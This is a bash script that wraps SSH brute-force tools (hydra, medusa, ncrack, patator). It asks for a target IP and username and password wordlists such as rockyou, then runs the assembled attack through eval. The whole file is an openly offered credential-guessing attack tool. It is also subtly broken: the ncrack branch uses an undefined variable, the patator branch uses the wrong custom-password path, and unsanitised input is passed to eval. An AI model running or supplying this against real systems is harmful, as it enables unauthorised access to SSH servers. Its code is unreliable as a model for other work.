#!/bin/bash


echo "IP"
read ip
echo "tool: (1)hydra (2)medusa (3)ncrack (4)patator"
read tool
echo "wordlist for username (1)default (2)no (3)custom"
read choice
if [ "$choice" = "1" ]; then
	userpath="user.txt"
elif [ "$choice" = "2" ]; then
	echo "enter username"
	read username
elif [ "$choice" = "3" ]; then
	echo "enter path"
	read path
else
	exit 1
fi
echo "Password: (1)rockyou (2)custom"
read passch
if [ "$passch" = "2" ]; then
	echo "enter path"
	read passpath
elif [ "$passch" = "1" ]; then
	cmd1="rockyou.txt"
else
	exit 1
fi
if [ "$tool" = "1" ]; then
	if [ "$choice" = "1" ]; then
		part1="-L $userpath"
	elif [ "$choice" = "2" ]; then
		part1="-l $username"
	elif [ "$choice" = "3" ]; then
		part1="-L $path"
	else
		exit 1
	fi
	if [ "$passch" = "2" ]; then
		part2="-P $passpath"
	elif [ "$passch" = "1" ]; then
		part2="-P $cmd1"
	else
		exit 1
	fi
	cmd="hydra $part1 $part2 ssh://$ip"
elif [ "$tool" = "2" ]; then
	if [ "$choice" = "1" ]; then
		part1="-U user.txt"
	elif [ "$choice" = "2" ]; then
		part1="-u $username"
	elif [ "$choice" = "3" ]; then
		part1="-U $path"
	else
		exit 1
	fi
	if [ "$passch" = "1" ]; then
		part2="-P $cmd1"
	elif [ "$passch" = "2" ]; then
		part2="-P $passpath"
	else
		exit 1
	fi
	cmd="medusa -h $ip $part1 $part2 -M ssh"
elif [ "$tool" = "3" ]; then
	if [ "$choice" = "1" ]; then
		part1="-U user.txt"
	elif [ "$choice" = "2" ]; then
		part1="-u $username"
	elif [ "$choice" = "3" ]; then
		part1="-U $path"
	else
		exit 1
	fi
	if [ "$passch" = "1" ]; then
		part2="-P $cm1"
	elif [ "$passch" = "2" ]; then
		part2="-P $passpath"
	else
		exit 1
	fi
	cmd="ncrack -p 22 $part1 $part2 $ip"
elif [ "$tool" = "4" ]; then
	if [ "$choice" = "1" ]; then
		part1="user=FILE0 0=user.txt"
	elif [ "$choice" = "2" ]; then
		part1="user=$username"
	elif [ "$choice" = "3" ]; then
		part1="user=FILE0 0=$path"
	else
		exit 1
	fi
	if [ "$passch" = "1" ]; then
		part2="password=FILE1 1=rockyou.txt"
	elif [ "$passch" = "2" ]; then
		part2="password=FILE1 1=$path"
	else
		exit 1
	fi
	cmd="patator ssh_login host=$ip $part1 $part2 ignore.mesg='Authentication failed.'"
else
	exit 1
fi
echo "Starting..."
sleep 3
eval "$cmd"
